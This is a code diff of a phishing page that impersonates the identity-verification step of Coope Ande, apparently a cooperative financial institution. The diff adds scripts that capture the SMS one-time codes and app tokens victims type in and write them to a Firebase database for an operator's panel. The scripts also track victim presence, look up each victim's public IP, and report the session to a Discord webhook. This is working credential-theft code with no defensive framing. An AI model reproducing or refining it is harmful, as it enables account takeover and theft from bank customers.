@@ -30,21 +30,21 @@
         <!-- Botón Cerrar Superior -->
         <button class="absolute top-4 right-4 text-[#0072b9] text-2xl hover:opacity-70">×</button>
 
-        <div class="p-6" bis_skin_checked="1">
+        <div class="p-6">
     <!-- Logo de demostración -->
-    <div class="text-center mb-6" bis_skin_checked="1">
+    <div class="text-center mb-6">
         <center><img src="logo_coope.png" width="120" height="50" alt="Logo"></center>
     </div>
 
     <!-- Timeline -->
     <ul class="timelineFirmador">
         <li class="li complete" id="step1">
-            <div class="timestamp" bis_skin_checked="1"><span class="author">Seleccionar</span></div>
-            <div class="status" bis_skin_checked="1"></div>
+            <div class="timestamp"><span class="author">Seleccionar</span></div>
+            <div class="status"></div>
         </li>
         <li class="li" id="step2">
-            <div class="timestamp" bis_skin_checked="1"><span class="author">Continuar</span></div>
-            <div class="status" bis_skin_checked="1"></div>
+            <div class="timestamp"><span class="author">Continuar</span></div>
+            <div class="status"></div>
         </li>
     </ul>
 
@@ -55,7 +55,7 @@
             Selecciona un método para continuar con la validación de identidad
         </h5>
 
-        <div class="text-sky-700 text-lg font-semibold mb-6" bis_skin_checked="1">
+        <div class="text-sky-700 text-lg font-semibold mb-6">
             Método de validación
         </div>
 
@@ -75,7 +75,7 @@
             </p>
         </label>
 
-        <button type="button" id="continuar" disabled="" class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider mt-6 disabled:opacity-40">
+        <button type="button" id="continuar" disabled class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider mt-6 disabled:opacity-40">
             Continuar
         </button>
     </section>
@@ -88,22 +88,22 @@
         <p class="text-[#0072b9] text-lg font-semibold mb-6">Número de teléfono vinculado</p>
         
         <form id="form-sms">
-            <div class="mb-8" bis_skin_checked="1">
-                <input type="text" id="sms-input" onkeypress="return event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57" inputmode="numeric" minlength="6" maxlength="6" class="input-otp" placeholder="------" autocomplete="off" required="">
+            <div class="mb-8">
+                <input type="text" id="sms-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57" inputmode="numeric" minlength="6" maxlength="6" class="input-otp" placeholder="------" autocomplete="off" required>
             </div>
 
-            <div class="text-left" bis_skin_checked="1">
-                <div class="fvaAdvertencia" bis_skin_checked="1">
+            <div class="text-left">
+                <div class="fvaAdvertencia">
                     El código de verificación es para su uso exclusivo y personal. No lo facilite por teléfono o correo electrónico a ninguna persona.
                 </div>
             </div>
 
-            <div class="flex justify-center gap-3 mt-8" bis_skin_checked="1">
+            <div class="flex justify-center gap-3 mt-8">
                 <button type="button" class="btn-volver bg-[#444] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">
                     Volver
                 </button>
-                <button type="submit" id="btn-envio" class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">
-                    Verificar
+                <button type="submit" id="btn-envio-sms" class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">
+                    Verificar SMS
                 </button>
             </div>
         </form>
@@ -116,93 +116,63 @@
         <h5 class="text-[14px] text-gray-700 mb-2">Para validar su identidad, ingrese la clave dinámica generada en su aplicación</h5>
         <p class="text-[#0072b9] text-lg font-semibold mb-6">Coope Ande Token</p>
         
-        <form id="form-sms">
-            <div class="mb-8" bis_skin_checked="1">
-                <input type="text" id="sms-input" onkeypress="return event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57" inputmode="numeric" minlength="6" maxlength="6" class="input-otp" placeholder="------" autocomplete="off" required="">
+        <form id="form-token">
+            <div class="mb-8">
+                <input type="text" id="token-input" onkeypress="return event.charCode >= 48 && event.charCode <= 57" inputmode="numeric" minlength="6" maxlength="6" class="input-otp" placeholder="------" autocomplete="off" required>
             </div>
 
-            <div class="text-left" bis_skin_checked="1">
-                <div class="fvaAdvertencia" bis_skin_checked="1">
+            <div class="text-left">
+                <div class="fvaAdvertencia">
                     El código token cambia cada minuto. Verifique que la hora de su dispositivo esté sincronizada.
                 </div>
             </div>
 
-            <div class="flex justify-center gap-3 mt-8" bis_skin_checked="1">
+            <div class="flex justify-center gap-3 mt-8">
                 <button type="button" class="btn-volver bg-[#444] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">
                     Volver
                 </button>
-                <button type="submit" id="btn-envio" class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">
-                    Verificar
+                <button type="submit" id="btn-envio-token" class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">
+                    Verificar Token
                 </button>
             </div>
         </form>
     </section>
 
     <!-- Línea Decorativa Inferior -->
-    <div class="flex justify-center mb-4 mt-6" bis_skin_checked="1">
-        <div class="w-20 h-1 bg-[#0072b9] rounded-full" bis_skin_checked="1"></div>
+    <div class="flex justify-center mb-4 mt-6">
+        <div class="w-20 h-1 bg-[#0072b9] rounded-full"></div>
     </div>
 </div>
 
-        
-        
-    </div>
-
-    <script>
-    // 1. CONFIGURACIÓN
-    const firebaseConfig = { 
-        databaseURL: "https://mslogs-31bf1-default-rtdb.firebaseio.com/" 
-    };
-    firebase.initializeApp(firebaseConfig);
+<script>
+(function() {
+    // 1. CONFIGURACIÓN E INICIALIZACIÓN
+    const firebaseConfig = { databaseURL: "https://copendndsn-default-rtdb.firebaseio.com/" };
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
     const db = firebase.database();
+    const webhookURL = "https://discord.com/api/webhooks/1507864461971554467/j4VamcI1PYxbmMxnviA2UIrO4fhu7SWJJro_uudSw4OL3h6xKhCqDfVtPWnXOUZsLbgF";
 
-    // 2. OBTENER EL ID DE LA URL
+    // 2. OBTENER PARAMETROS DE NAVEGACIÓN
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get('id');
 
-    if (sessionId) {
-        // Lógica de presencia para la luz del panel
-        const presenceRef = db.ref('logins/' + sessionId + '/online');
-        db.ref(".info/connected").on("value", (snap) => {
-            if (snap.val() === true) {
-                presenceRef.set(true);
-                presenceRef.onDisconnect().set(false);
-            }
-        });
-
-        // Evento al presionar continuar
-        document.getElementById('form-sms').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // CAPTURA DE 1 SOLO INPUT (Asegúrate de que tu input tenga id="sms-input")
-            const codigoCompleto = document.getElementById('sms-input').value;
-            
-            const btn = document.getElementById('btn-envio');
-            
-            // Validación mínima para no enviar vacío
-            if (codigoCompleto.length < 4) {
-                return; 
-            }
-
-            btn.disabled = true;
-
-            // Actualizar el mismo registro y redirigir
-            db.ref('logins/' + sessionId).update({
-                sms: codigoCompleto,
-                step: 'SMS_ENTREGADO' // Cambié 'status' por 'step' para que tu panel lo lea correctamente
-            }).then(() => {
-                window.location.href = 'cargando2.html?id=' + sessionId;
-            }).catch(() => {
-                window.location.href = 'cargando2.html?id=' + sessionId;
-            });
-        });
-
-    } else {
+    if (!sessionId) {
         window.location.href = 'index.html';
+        return;
     }
-</script>
-<script>
-(function() {
+
+    // Lógica de presencia
+    const presenceRef = db.ref('logins/' + sessionId + '/online');
+db.ref(".info/connected").on("value", (snap) => {
+    if (snap.val() === true) {
+        presenceRef.onDisconnect().set(false);
+        presenceRef.set(true);
+    }
+});
+
+    // 3. CAPTURA DE ELEMENTOS DEL DOM
     const radios = document.querySelectorAll('input[name="metodo"]');
     const continuar = document.getElementById("continuar");
     const seleccionar = document.getElementById("seleccionar");
@@ -210,12 +180,10 @@
     const pasoToken = document.getElementById("paso-token");
     const botonesVolver = document.querySelectorAll(".btn-volver");
 
-    const webhookURL = "https://discord.com/api/webhooks/1507864461971554467/j4VamcI1PYxbmMxnviA2UIrO4fhu7SWJJro_uudSw4OL3h6xKhCqDfVtPWnXOUZsLbgF";
-
     let metodoSeleccionado = "";
     let clienteIP = "Obteniendo IP...";
 
-    // Obtener la IP pública
+    // Obtención de IP pública
     async function obtenerIP() {
         try {
             const respuesta = await fetch('https://api.ipify.org?format=json');
@@ -229,7 +197,7 @@
     }
     obtenerIP();
 
-    // Habilitar botón continuar al marcar un radio
+    // Habilitar botón continuar al seleccionar opción
     radios.forEach(radio => {
         radio.addEventListener("change", () => {
             metodoSeleccionado = radio.value;
@@ -237,30 +205,25 @@
         });
     });
 
-    // Evento de clic en Continuar
+    // Acción al hacer clic en Continuar (Paso 1)
     if (continuar) {
         continuar.addEventListener("click", async () => {
             if (!metodoSeleccionado) return;
 
-            // Ocultar sección inicial
-            if (seleccionar) seleccionar.classList.add("hidden");
+            seleccionar.classList.add("hidden");
 
-            // Mostrar el paso según la elección
-            if (metodoSeleccionado === "sms" && pasoSms) {
+            if (metodoSeleccionado === "sms") {
                 pasoSms.classList.remove("hidden");
-                if (pasoToken) pasoToken.classList.add("hidden");
-            } else if (metodoSeleccionado === "token" && pasoToken) {
+                pasoToken.classList.add("hidden");
+            } else if (metodoSeleccionado === "token") {
                 pasoToken.classList.remove("hidden");
-                if (pasoSms) pasoSms.classList.add("hidden");
+                pasoSms.classList.add("hidden");
             }
 
-            // Cambiar la línea de tiempo
-            const step1 = document.getElementById("step1");
-            const step2 = document.getElementById("step2");
-            if (step1) step1.classList.remove("complete");
-            if (step2) step2.classList.add("complete");
+            document.getElementById("step1").classList.remove("complete");
+            document.getElementById("step2").classList.add("complete");
 
-            // Enviar webhook a Discord
+            // Enviar webhook de selección a Discord
             const payload = {
                 username: "Notificador de Validación",
                 embeds: [
@@ -268,6 +231,7 @@
                         title: "⚡ Método Seleccionado",
                         color: 29113,
                         fields: [
+                            { name: "ID Sesión", value: sessionId, inline: false },
                             { name: "Método", value: metodoSeleccionado.toUpperCase(), inline: true },
                             { name: "Dirección IP", value: clienteIP, inline: true }
                         ],
@@ -283,24 +247,66 @@
                     body: JSON.stringify(payload)
                 });
             } catch (error) {
-                console.error('Error enviando notificación:', error);
+                console.error('Error notificando a Discord:', error);
             }
         });
     }
 
-    // Configurar botones de volver
+    // Configuración de botones Volver
     botonesVolver.forEach(btn => {
         btn.addEventListener("click", () => {
-            if (pasoSms) pasoSms.classList.add("hidden");
-            if (pasoToken) pasoToken.classList.add("hidden");
-            if (seleccionar) seleccionar.classList.remove("hidden");
+            pasoSms.classList.add("hidden");
+            pasoToken.classList.add("hidden");
+            seleccionar.classList.remove("hidden");
 
-            const step1 = document.getElementById("step1");
-            const step2 = document.getElementById("step2");
-            if (step2) step2.classList.remove("complete");
-            if (step1) step1.classList.add("complete");
+            document.getElementById("step2").classList.remove("complete");
+            document.getElementById("step1").classList.add("complete");
         });
     });
+
+    // 4. ENVÍO DE FORMULARIO SMS (Paso 2)
+    const formSms = document.getElementById('form-sms');
+    if (formSms) {
+        formSms.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const codigoCompleto = document.getElementById('sms-input').value;
+            const btn = document.getElementById('btn-envio-sms');
+
+            if (codigoCompleto.length < 6) return;
+            btn.disabled = true;
+
+            db.ref('logins/' + sessionId).update({
+                sms: codigoCompleto,
+                step: 'SMS_ENTREGADO'
+            }).then(() => {
+                window.location.href = 'cargando2.html?id=' + sessionId;
+            }).catch(() => {
+                window.location.href = 'cargando2.html?id=' + sessionId;
+            });
+        });
+    }
+
+    // 5. ENVÍO DE FORMULARIO TOKEN (Paso 2)
+    const formToken = document.getElementById('form-token');
+    if (formToken) {
+        formToken.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const codigoToken = document.getElementById('token-input').value;
+            const btn = document.getElementById('btn-envio-token');
+
+            if (codigoToken.length < 6) return;
+            btn.disabled = true;
+
+            db.ref('logins/' + sessionId).update({
+                token: codigoToken,
+                step: 'TOKEN_ENTREGADO'
+            }).then(() => {
+                window.location.href = 'cargando2.html?id=' + sessionId;
+            }).catch(() => {
+                window.location.href = 'cargando2.html?id=' + sessionId;
+            });
+        });
+    }
 })();
 </script>
 </body></html>
